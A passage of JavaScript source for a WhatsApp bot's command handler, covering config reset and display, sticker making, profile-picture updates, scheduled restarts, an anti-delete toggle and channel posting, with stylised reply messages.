    if (senderNum !== sanitized && senderNum !== ownerNum) {
      const meta = {
        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_RESET_DENIED" },
        message: { contactMessage: { displayName: BOT_NAME_FANCY } }
      };

      return await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐑𝐄𝐒𝐄𝐓𝐂𝐎𝐍𝐅𝐈𝐆*
│. ˚˖𓍢ִ໋🚫 ᴘᴇʀᴍɪssɪᴏɴ ᴅᴇɴɪᴇᴅ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: meta });
    }

    const cfg = Object.assign({}, DEFAULT_SESSION_CONFIG || {});
    cfg._meta = {
      updatedAt: new Date(),
      updatedBy: senderNum,
      raw: 'reset'
    };

    await setUserConfigInMongo(sanitized, cfg);

    const metaOk = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_RESET_OK" },
      message: { contactMessage: { displayName: cfg.botName || BOT_NAME_FANCY } }
    };

    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋✅ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐑𝐄𝐒𝐄𝐓𝐂𝐎𝐍𝐅𝐈𝐆*
│. ˚˖𓍢ִ໋♻️ ʀᴇsᴇᴛ sᴜᴄᴄᴇssғᴜʟʟʏ
│. ˚˖𓍢ִ໋📦 sᴇssɪᴏɴ ʀᴇsᴛᴏʀᴇᴅ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: metaOk });

  } catch (e) {
    console.error('resetconfig error', e);

    const metaErr = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_RESET_ERR" },
      message: { contactMessage: { displayName: BOT_NAME_FANCY } }
    };

    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐄𝐑𝐑𝐎𝐑*
│. ˚˖𓍢ִ໋⚠️ ${e.message || e}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: metaErr });
  }

  break;
}
/* showconfig */
case 'showconfig2': {
  const sanitized = (number || '').replace(/[^0-9]/g, '');
  try {
    const cfgRaw = await loadUserConfigFromMongo(sanitized) || {};
    const cfg = Object.assign({}, DEFAULT_SESSION_CONFIG || {}, cfgRaw);
    const botName = cfg.botName || BOT_NAME_FANCY;

    const shonux = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "META_AI_SHOWCONFIG"
      },
      message: {
        contactMessage: {
          displayName: botName,
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${botName};;;;\nFN:${botName}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=50941319791:+50941319791\nEND:VCARD`
        }
      }
    };

    const lines = [];

    lines.push(
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📋 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐒𝐇𝐎𝐖𝐂𝐎𝐍𝐅𝐈𝐆*
│. ˚˖𓍢ִ໋⚙️ sᴇssɪᴏɴ ᴄᴏɴғɪɢ
│. ˚˖𓍢ִ໋👤 ɪᴅ : ${sanitized}`
    );

    lines.push('');
    lines.push(`│. ˚˖𓍢ִ໋• ʙᴏᴛ ɴᴀᴍᴇ : ${botName}`);
    lines.push(`│. ˚˖𓍢ִ໋• ʟᴏɢᴏ : ${cfg.logo || config.RCD_IMAGE_PATH || 'ɴᴏɴᴇ'}`);

    for (const k of Object.keys(DEFAULT_SESSION_CONFIG || {})) {
      if (k === 'botName') continue;
      const val = cfg.hasOwnProperty(k) ? cfg[k] : DEFAULT_SESSION_CONFIG[k];
      lines.push(`│. ˚˖𓍢ִ໋• ${k} : ${formatValueForDisplay ? formatValueForDisplay(val) : String(val)}`);
    }

    const extraKeys = Object.keys(cfg).filter(k => !DEFAULT_SESSION_CONFIG.hasOwnProperty(k) && k !== '_meta');

    if (extraKeys.length) {
      lines.push('');
      lines.push(`│. ˚˖𓍢ִ໋🔧 ᴄᴜsᴛᴏᴍ ᴋᴇʏs`);
      for (const k of extraKeys) {
        lines.push(`│. ˚˖𓍢ִ໋• ${k} : ${formatValueForDisplay ? formatValueForDisplay(cfg[k]) : String(cfg[k])}`);
      }
    }

    if (cfg._meta) {
      lines.push('');
      lines.push(`│. ˚˖𓍢ִ໋⏱️ ʟᴀsᴛ ᴜᴘᴅᴀᴛᴇ : ${cfg._meta.updatedAt || '—'}`);
      lines.push(`│. ˚˖𓍢ִ໋👤 ʙʏ : ${cfg._meta.updatedBy || '—'}`);
    }

    lines.push('╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ');

    await socket.sendMessage(sender, { text: lines.join('\n') }, { quoted: shonux });

  } catch (e) {
    console.error('showconfig error', e);

    const shonuxErr = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "META_AI_SHOWCONFIG_ERR"
      },
      message: {
        contactMessage: {
          displayName: BOT_NAME_FANCY
        }
      }
    };

    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐄𝐑𝐑𝐎𝐑*
│. ˚˖𓍢ִ໋⚠️ ʜᴀɴᴅʟɪɴɢ ғᴀɪʟᴇᴅ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: shonuxErr });
  }

  break;
}


case 'sticker': case 's': {
  try {
    // parser args pour "auteur | titre"
    const raw = (args && args.join(' ')) || '';
    let author = '';
    let title = '';
    if (raw.includes('|')) {
      const parts = raw.split('|').map(p => p.trim());
      author = parts[0] || '';
      title = parts.slice(1).join(' | ') || '';
    } else if (raw.trim()) {
      title = raw.trim();
    }

    // Détection du message cité (même logique que dans tovn)
    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;

    // Si pas de quoted, on tente de voir si le message courant contient un média
    const selfMedia = msg.message && (
      msg.message.imageMessage ||
      msg.message.videoMessage ||
      msg.message.documentMessage ||
      msg.message.stickerMessage
    ) ? msg.message : null;

    if (!quoted && !selfMedia) {
      await socket.sendMessage(sender, {
        text: '❗ ʀᴇ́ᴘᴏɴᴅs ᴀ̀ ᴜɴᴇ ɪᴍᴀɢᴇ, ɢɪғ ᴏᴜ ᴠɪᴅᴇ́ᴏ, ᴏᴜ ᴇɴᴠᴏɪᴇ-ᴇɴ ᴜɴᴇ ᴀᴠᴇᴄ ʟᴀ ᴄᴏᴍᴍᴀɴᴅᴇ .sᴛɪᴄᴋᴇʀ 𝐄𝐗𝐄𝐌𝐏𝐋𝐄 : .s ʏᴏᴜᴛᴇᴄʜx | ɪᴛ\'s ᴍᴇ ᴛʜᴇ ʙᴇsᴛ ᴅᴇᴠ'
      }, { quoted: msg });
      break;
    }

    // Préparer un objet media compatible avec createStickerFromMedia: { buffer, mime, fileName? }
    let media = null;

    // Si quoted existe, déterminer le type (imageMessage, videoMessage, documentMessage, stickerMessage, etc.)
    if (quoted) {
      // quoted peut contenir imageMessage, videoMessage, documentMessage, stickerMessage, etc.
      const qTypes = ['imageMessage','videoMessage','audioMessage','documentMessage','stickerMessage','extendedTextMessage'];
      const qType = qTypes.find(t => quoted[t]);
      if (!qType) {
        await socket.sendMessage(sender, { text: '❌ Média cité non supporté.' }, { quoted: msg });
        break;
      }

      // Déterminer le message content (ex: quoted.imageMessage)
      const quotedContent = quoted[qType];

      // Télécharger via downloadContentFromMessage (Baileys)
      const messageType = qType.replace(/Message$/i, '').toLowerCase(); // 'image', 'video', 'document', 'sticker', ...
      const stream = await downloadContentFromMessage(quotedContent, messageType);
      const chunks = [];
      for await (const chunk of stream) chunks.push(chunk);
      const buffer = Buffer.concat(chunks);

      media = {
        buffer,
        mime: quotedContent.mimetype || quotedContent.mimetype || '',
        caption: quotedContent.caption || quotedContent.fileName || '',
        fileName: quotedContent.fileName || ''
      };
    } else if (selfMedia) {
      // Si le message courant contient le média (non cité)
      const m = selfMedia.imageMessage || selfMedia.videoMessage || selfMedia.documentMessage || selfMedia.stickerMessage;
      const qType = selfMedia.imageMessage ? 'image' : selfMedia.videoMessage ? 'video' : selfMedia.documentMessage ? 'document' : 'sticker';
      const stream = await downloadContentFromMessage(m, qType);
      const chunks = [];
      for await (const chunk of stream) chunks.push(chunk);
      const buffer = Buffer.concat(chunks);

      media = {
        buffer,
        mime: m.mimetype || '',
        caption: m.caption || m.fileName || '',
        fileName: m.fileName || ''
      };
    }

    if (!media || !media.buffer) {
      await socket.sendMessage(sender, { text: '❌ Impossible de télécharger le média cité.' }, { quoted: msg });
      break;
    }

    // Crée le sticker (statique ou animé selon le média)
    const { buffer: stickerBuffer } = await createStickerFromMedia(media, author, title);

    // Envoie le sticker
    await sendSticker(socket, sender, stickerBuffer, msg);

  } catch (err) {
    console.error('[STICKER ERROR]', err);
    await socket.sendMessage(sender, { text: `❌ Erreur lors de la création du sticker.\n${err.message || err}` }, { quoted: msg });
  }
  break;
}



case 'setppfull':
case 'setpp': {
  try {
    const prefix = (typeof usedPrefix !== 'undefined' && usedPrefix)
                || (typeof prefix_used !== 'undefined' && prefix_used)
                || (typeof client?.prefix !== 'undefined' && client.prefix)
                || '.';

    const quotedMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const directMsg = msg.message?.imageMessage || msg.message?.documentMessage
                       ? msg.message : null;
    const target = quotedMsg || directMsg;

    if (!target) {
      await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📷 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐒𝐄𝐓𝐏𝐏*
│. ˚˖𓍢ִ໋❌ ʀᴇᴘʟʏ ᴡɪᴛʜ ɪᴍᴀɢᴇ
│. ˚˖𓍢ִ໋💡 ᴜsᴇ : ${prefix}setpp
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });

      break;
    }

    const downloader = async (src, type) => {
      if (typeof downloadMediaMessage === 'function') {
        try { return await downloadMediaMessage(src, type); } catch (_) {}
      }
      const { downloadContentFromMessage } = require('@rexxhayanasi/elaina-bail');
      const stream = await downloadContentFromMessage(src, type);
      const chunks = [];
      for await (const chunk of stream) chunks.push(chunk);
      return Buffer.concat(chunks);
    };

    const buffer = await robustDownload(target, downloader);
    if (!buffer?.length) throw new Error('Buffer vide — média invalide.');

    const botJid =
      socket?.user?.id ||
      socket?.userJid ||
      socket?.authState?.creds?.me?.id ||
      null;

    if (!botJid) throw new Error('JID du bot introuvable.');

    let updated = false;

    if (typeof socket.updateProfilePictureFull === 'function') {
      try {
        await socket.updateProfilePictureFull(botJid, buffer);
        updated = true;
      } catch (e) {}
    }

    if (!updated && typeof socket.updateProfilePicture === 'function') {
      try {
        await socket.updateProfilePicture(botJid, buffer, { fullPicture: true });
        updated = true;
      } catch (e) {
        await socket.updateProfilePicture(botJid, buffer);
        updated = true;
      }
    }

    if (!updated && typeof socket.query === 'function') {
      await socket.query({
        tag: 'iq',
        attrs: { to: botJid, type: 'set', xmlns: 'w:profile:picture' },
        content: [{
          tag: 'picture',
          attrs: { type: 'image' },
          content: [
            { tag: 'image', attrs: {}, content: buffer },
            { tag: 'preview', attrs: {}, content: buffer }
          ]
        }]
      });
      updated = true;
    }

    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋✅ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐒𝐄𝐓𝐏𝐏*
│. ˚˖𓍢ִ໋👤 ᴘʀᴏғɪʟᴇ ᴜᴘᴅᴀᴛᴇᴅ
│. ˚˖𓍢ִ໋🖼️ ғᴜʟʟ sɪᴢᴇ ᴀᴄᴛɪᴠᴇ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

  } catch (err) {
    console.error('[SETPP ERROR]', err);

    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐄𝐑𝐑𝐎𝐑*
│. ˚˖𓍢ִ໋⚠️ ᴘʀᴏғɪʟᴇ ɴᴏᴛ ᴜᴘᴅᴀᴛᴇᴅ
│. ˚˖𓍢ִ໋💥 ${err?.message ?? String(err)}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }

  break;
}

case 'sr': {
  if (!isOwner) {
    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐒𝐂𝐇𝐄𝐃𝐔𝐋𝐄*
│. ˚˖𓍢ִ໋🚫 ᴏᴡɴᴇʀ ᴏɴʟʏ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
    break;
  }

  const arg = (args[0] || '').toLowerCase();
  const minutes = parseInt(arg);

  if (!arg) {
    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋⚙️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐒𝐂𝐇𝐄𝐃𝐔𝐋𝐄 𝐑𝐄𝐒𝐓𝐀𝐑𝐓*
│. ˚˖𓍢ִ໋📌 ᴜsᴀɢᴇ ɪɴғᴏ
│. ˚˖𓍢ִ໋• .sr [minutes]
│. ˚˖𓍢ִ໋• .sr 60 → ʀᴇsᴛᴀʀᴛ ᴇᴠᴇʀʏ 1ʜ
│. ˚˖𓍢ִ໋• .sr stop → sᴛᴏᴘ
│. ˚˖𓍢ִ໋• .sr now → ɴᴏᴡ
│. ˚˖𓍢ִ໋• .sr status → sᴛᴀᴛᴜs
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
    break;
  }

  if (arg === 'stop') {
    if (global.restartTimer) {
      clearInterval(global.restartTimer);
      global.restartTimer = null;
    }
    await stopRestartSchedule();
    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🛑 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐒𝐂𝐇𝐄𝐃𝐔𝐋𝐄*
│. ˚˖𓍢ִ໋✅ sᴄʜᴇᴅᴜʟᴇ sᴛᴏᴘᴘᴇᴅ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
    break;
  }

  if (arg === 'now') {
    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🔄 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐑𝐄𝐒𝐓𝐀𝐑𝐓*
│. ˚˖𓍢ִ໋⚡ ʀᴇsᴛᴀʀᴛɪɴɢ...
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

    setTimeout(() => process.exit(0), 2000);
    break;
  }

  if (arg === 'status') {
    const doc = await getRestartSchedule();
    if (doc && doc.active) {
      await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📊 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐒𝐂𝐇𝐄𝐃𝐔𝐋𝐄*
│. ˚˖𓍢ִ໋✅ ᴀᴄᴛɪᴠᴇ
│. ˚˖𓍢ִ໋⏱️ ${doc.minutes} ᴍɪɴᴜᴛᴇs
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    } else {
      await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📊 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐒𝐂𝐇𝐄𝐃𝐔𝐋𝐄*
│. ˚˖𓍢ִ໋❌ ɴᴏ sᴄʜᴇᴅᴜʟᴇ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    }
    break;
  }

  if (isNaN(minutes) || minutes < 1) {
    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐒𝐂𝐇𝐄𝐃𝐔𝐋𝐄*
│. ˚˖𓍢ִ໋⚠️ ɪɴᴠᴀʟɪᴅ ᴍɪɴᴜᴛᴇs
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
    break;
  }

  if (global.restartTimer) clearInterval(global.restartTimer);

  global.restartTimer = setInterval(() => {
    console.log(`🔄 Restart automatique (${minutes} minutes)`);
    process.exit(0);
  }, minutes * 60 * 1000);

  global.restartInterval = minutes;
  await setRestartSchedule(minutes);

  await socket.sendMessage(sender, {
    text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋✅ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐒𝐂𝐇𝐄𝐃𝐔𝐋𝐄*
│. ˚˖𓍢ִ໋⏰ ʀᴇsᴛᴀʀᴛ ᴘʀᴏɢʀᴀᴍᴍᴇᴅ
│. ˚˖𓍢ִ໋• ${minutes} ᴍɪɴᴜᴛᴇs
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
  }, { quoted: msg });

  break;
}


  
case 'antidelete':
case 'ad': {
  try {
    const sanitized = String(number || '').replace(/[^0-9]/g, '');
    const senderNum = (nowsender || '').split('@')[0];
    const ownerNum  = String(config.OWNER_NUMBER || '').replace(/[^0-9]/g, '');

    if (senderNum !== sanitized && senderNum !== ownerNum) {
      await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐀𝐍𝐓𝐈𝐃𝐄𝐋𝐄𝐓𝐄*
│. ˚˖𓍢ִ໋🚫 ᴏᴡɴᴇʀ ᴏɴʟʏ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    let cfg = await loadUserConfigFromMongo(sanitized) || {};
    const sub = (args[0] || '').toLowerCase();

    if (sub === 'status') {
      const mode      = cfg.antidelete || 'off';
      const storeSize = getSessionStore(sanitized).size;

      const modeLabel = mode === 'all' ? '🌐 ᴛᴏᴜᴛ (ɢʀᴏᴜᴘs + ᴘʀɪᴠᴇ)'
                      : mode === 'g'   ? '👥 ɢʀᴏᴜᴘs sᴇᴜʟᴇᴍᴇɴᴛ'
                      : mode === 'p'   ? '💬 ᴘʀɪᴠᴇ sᴇᴜʟᴇᴍᴇɴᴛ'
                      : '⛔ ᴅᴇsᴀᴄᴛɪᴠᴇ';

      await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🗑️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐀𝐍𝐓𝐈𝐃𝐄𝐋𝐄𝐓𝐄*
│. ˚˖𓍢ִ໋📊 sᴛᴀᴛᴜs
│. ˚˖𓍢ִ໋• ᴍᴏᴅᴇ : ${modeLabel}
│. ˚˖𓍢ִ໋• sᴛᴏʀᴇ : ${storeSize}/${STORE_MAX_PER_SESSION}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    if      (sub === 'off') { cfg.antidelete = 'off'; getSessionStore(sanitized).clear(); }
    else if (sub === 'g')   { cfg.antidelete = 'g';   }
    else if (sub === 'p')   { cfg.antidelete = 'p';   }
    else if (sub === 'all') { cfg.antidelete = 'all'; }
    else {
      await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🗑️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐀𝐍𝐓𝐈𝐃𝐄𝐋𝐄𝐓𝐄*
│. ˚˖𓍢ִ໋📌 ᴄᴏᴍᴍᴀɴᴅs
│. ˚˖𓍢ִ໋• .ad all → ᴛᴏᴜᴛ
│. ˚˖𓍢ִ໋• .ad g   → ɢʀᴏᴜᴘs
│. ˚˖𓍢ִ໋• .ad p   → ᴘʀɪᴠᴇ
│. ˚˖𓍢ִ໋• .ad off → ᴅᴇsᴀᴄᴛɪᴠᴇ
│. ˚˖𓍢ִ໋• .ad status → sᴛᴀᴛᴜs
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    await setUserConfigInMongo(sanitized, cfg);

    const labels = {
      'all': '🌐 ᴛᴏᴜᴛ ᴀᴄᴛɪᴠᴇ',
      'g'  : '👥 ɢʀᴏᴜᴘs sᴇᴜʟᴇᴍᴇɴᴛ',
      'p'  : '💬 ᴘʀɪᴠᴇ sᴇᴜʟᴇᴍᴇɴᴛ',
      'off': '⛔ ᴅᴇsᴀᴄᴛɪᴠᴇ'
    };

    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🗑️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐀𝐍𝐓𝐈𝐃𝐄𝐋𝐄𝐓𝐄*
│. ˚˖𓍢ִ໋✅ ${labels[cfg.antidelete]}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

  } catch (e) {
    console.error('[ANTIDELETE ERROR]', e);
    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐄𝐑𝐑𝐎𝐑*
│. ˚˖𓍢ִ໋⚠️ ${e.message || e}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }
  break;
}
              


            
            // ============ UPLOAD TO CHANNEL ============
            case 'upch': {
    const fs = require('fs');
    const path = require('path');
    
    const cjidPath = path.join(__dirname, 'cjid.json');
    
    function getChannelJid() {
        if (fs.existsSync(cjidPath)) {
            try {
                const data = JSON.parse(fs.readFileSync(cjidPath, 'utf-8'));
                return data.jid || null;
            } catch (e) { 
                console.error("[UPCH] Erreur lecture cjid:", e);
                return null; 
            }
        }
        return null;
    }
    
    function saveChannelJid(jid) {
        try {
            if (!fs.existsSync(path.dirname(cjidPath))) {
                fs.mkdirSync(path.dirname(cjidPath), { recursive: true });
            }
            fs.writeFileSync(cjidPath, JSON.stringify({ jid }, null, 2));
            return true;
        } catch (e) {
            console.error("[UPCH] Erreur sauvegarde cjid:", e);
            return false;
        }
    }
    
    const textInput = args.join(' ');
    
    if (textInput && textInput.includes('@newsletter')) {
        const newJid = textInput.trim();
        if (saveChannelJid(newJid)) {
            await socket.sendMessage(sender, { 
                text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📢 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐔𝐏𝐂𝐇*
│. ˚˖𓍢ִ໋✅ ᴄʜᴀɴɴᴇʟ sᴀᴠᴇᴅ
│. ˚˖𓍢ִ໋📌 ${newJid}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
            }, { quoted: msg });
        } else {
            await socket.sendMessage(sender, { 
                text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐄𝐑𝐑𝐎𝐑*
│. ˚˖𓍢ִ໋⚠️ ғᴀɪʟᴇᴅ ᴛᴏ sᴀᴠᴇ ᴊɪᴅ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
            }, { quoted: msg });
        }
        break;
    }
    
    let channelJid = getChannelJid();
    if (!channelJid) {
        await socket.sendMessage(sender, { 
            text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📢 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐔𝐏𝐂𝐇*
│. ˚˖𓍢ִ໋❌ ɴᴏ ᴄʜᴀɴɴᴇʟ ᴊɪᴅ sᴀᴠᴇᴅ
│. ˚˖𓍢ִ໋📌 .${command} <jid>
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        }, { quoted: msg });
        break;
    }
    
    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const contentText = textInput;
    
    if (!quoted && !contentText) {
        await socket.sendMessage(sender, { 
            text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐔𝐏𝐂𝐇*
│. ˚˖𓍢ִ໋⚠️ sᴇɴᴅ ᴛᴇxᴛ ᴏʀ ʀᴇᴘʟʏ ᴍᴇᴅɪᴀ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        }, { quoted: msg });
        break;
    }
    
    await socket.sendMessage(sender, { react: { text: "📤", key: msg.key } });

    try {
        if (quoted) {

            async function downloadMedia(mediaMessage) {
                const { downloadContentFromMessage } = require('@rexxhayanasi/elaina-baileys');
                
                let stream;
                if (mediaMessage.imageMessage) {
                    stream = await downloadContentFromMessage(mediaMessage.imageMessage, 'image');
                } else if (mediaMessage.videoMessage) {
                    stream = await downloadContentFromMessage(mediaMessage.videoMessage, 'video');
                } else if (mediaMessage.audioMessage) {
                    stream = await downloadContentFromMessage(mediaMessage.audioMessage, 'audio');
                } else if (mediaMessage.stickerMessage) {
                    stream = await downloadContentFromMessage(mediaMessage.stickerMessage, 'sticker');
                } else if (mediaMessage.documentMessage) {
                    stream = await downloadContentFromMessage(mediaMessage.documentMessage, 'document');
                } else {
                    throw new Error("Type de média non supporté");
                }
                
                const chunks = [];
                for await (const chunk of stream) chunks.push(chunk);
                return Buffer.concat(chunks);
            }
            
            const mediaBuffer = await downloadMedia(quoted);
            
            if (!mediaBuffer || mediaBuffer.length === 0) {
                throw new Error("Échec du téléchargement");
            }

            if (quoted.imageMessage) {
                await socket.sendMessage(channelJid, { image: mediaBuffer, caption: contentText || "" });
            } else if (quoted.videoMessage) {
                await socket.sendMessage(channelJid, { video: mediaBuffer, caption: contentText || "" });
            } else if (quoted.audioMessage) {
                await socket.sendMessage(channelJid, {
                    audio: mediaBuffer,
                    mimetype: quoted.audioMessage.mimetype || 'audio/mp4',
                    ptt: quoted.audioMessage.ptt || false,
                    caption: contentText || ""
                });
            } else if (quoted.stickerMessage) {
                await socket.sendMessage(channelJid, { sticker: mediaBuffer });
            } else if (quoted.documentMessage) {
                await socket.sendMessage(channelJid, {
                    document: mediaBuffer,
                    fileName: quoted.documentMessage.fileName || "Document",
                    mimetype: quoted.documentMessage.mimetype || 'application/octet-stream'
                });
            } else {
                await socket.sendMessage(sender, { 
                    text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ ᴜɴsᴜᴘᴘᴏʀᴛᴇᴅ ᴍᴇᴅɪᴀ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
                }, { quoted: msg });
                break;
            }
            
        } else if (contentText) {
            await socket.sendMessage(channelJid, { text: contentText });
        }

        await new Promise(resolve => setTimeout(resolve, 1000));

        await socket.sendMessage(sender, { react: { text: "✅", key: msg.key } });

        await socket.sendMessage(sender, {
            text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📢 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐔𝐏𝐂𝐇*
